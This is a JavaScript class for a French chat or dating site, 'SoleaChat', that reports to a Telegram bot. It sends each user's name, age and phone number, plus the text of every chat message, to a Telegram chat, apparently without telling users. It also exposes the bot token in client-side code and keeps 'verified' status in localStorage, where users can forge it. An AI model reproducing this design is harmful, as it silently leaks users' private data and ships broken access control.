class TelegramManager {
    constructor() {
        this.botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        this.chatId = CONFIG.TELEGRAM_CHAT_ID;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
        this.lastUpdateId = 0;
        this.startPolling();
    }

    async sendMessage(text) {
        try {
            const response = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Erreur envoi Telegram:', error);
        }
    }

    startPolling() {
        setInterval(async () => {
            await this.checkUpdates();
        }, 2000);
    }

    async checkUpdates() {
        try {
            const response = await fetch(`${this.apiUrl}/getUpdates`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    offset: this.lastUpdateId + 1,
                    timeout: 1
                })
            });
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    this.lastUpdateId = update.update_id;
                    await this.processCommand(update.message);
                }
            }
        } catch (error) {}
    }

    async processCommand(message) {
        if (!message || !message.text) return;
        const text = message.text.trim().toLowerCase();
        
        if (text.startsWith('/verifie')) {
            const parts = text.split(' ');
            const phoneNumber = parts[1];
            
            if (phoneNumber) {
                const users = JSON.parse(localStorage.getItem('soleachat_users') || '{}');
                
                if (users[phoneNumber]) {
                    users[phoneNumber].verified = true;
                    users[phoneNumber].verifiedAt = new Date().toISOString();
                    localStorage.setItem('soleachat_users', JSON.stringify(users));
                    
                    await this.sendMessage(`
✅ <b>COMPTE VÉRIFIÉ</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Nom:</b> ${users[phoneNumber].firstName} ${users[phoneNumber].lastName}
📱 <b>Téléphone:</b> ${phoneNumber}
🕐 <b>Vérifié le:</b> ${new Date().toLocaleString('fr-FR')}
━━━━━━━━━━━━━━━━━━━━━━
✨ L'utilisateur peut maintenant envoyer des messages !
                    `);
                }
            }
        }
        
        if (text.startsWith('/nonverifie')) {
            const parts = text.split(' ');
            const phoneNumber = parts[1];
            
            if (phoneNumber) {
                const users = JSON.parse(localStorage.getItem('soleachat_users') || '{}');
                
                if (users[phoneNumber]) {
                    users[phoneNumber].verified = false;
                    localStorage.setItem('soleachat_users', JSON.stringify(users));
                    
                    await this.sendMessage(`
❌ <b>VÉRIFICATION RETIRÉE</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Nom:</b> ${users[phoneNumber].firstName} ${users[phoneNumber].lastName}
📱 <b>Téléphone:</b> ${phoneNumber}
━━━━━━━━━━━━━━━━━━━━━━
🔒 L'utilisateur ne peut plus envoyer de messages
                    `);
                }
            }
        }
    }

    async notifyLogin(userData) {
        const message = `
💕 <b>BIENVENUE SUR SOLEACHAT</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Nom:</b> ${userData.firstName} ${userData.lastName}
📅 <b>Âge:</b> ${userData.age} ans
📱 <b>Téléphone:</b> ${userData.phoneNumber}
🕐 <b>Connexion:</b> ${new Date().toLocaleString('fr-FR')}
━━━━━━━━━━━━━━━━━━━━━━
⚠️ En attente de vérification
📝 Pour vérifier → /verifie ${userData.phoneNumber}
        `;
        return await this.sendMessage(message);
    }

    async logChatMessage(messageData) {
        const notif = `
💬 <b>MESSAGE CHAT</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>De:</b> ${messageData.senderName}
💭 <b>Message:</b> ${messageData.text}
🕐 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
        `;
        return await this.sendMessage(notif);
    }

    saveUser(userData) {
        const users = JSON.parse(localStorage.getItem('soleachat_users') || '{}');
        users[userData.phoneNumber] = {
            ...userData,
            lastLogin: new Date().toISOString(),
            isOnline: true,
            verified: false
        };
        localStorage.setItem('soleachat_users', JSON.stringify(users));
    }
}

const telegramManager = new TelegramManager();
window.telegramManager = telegramManager;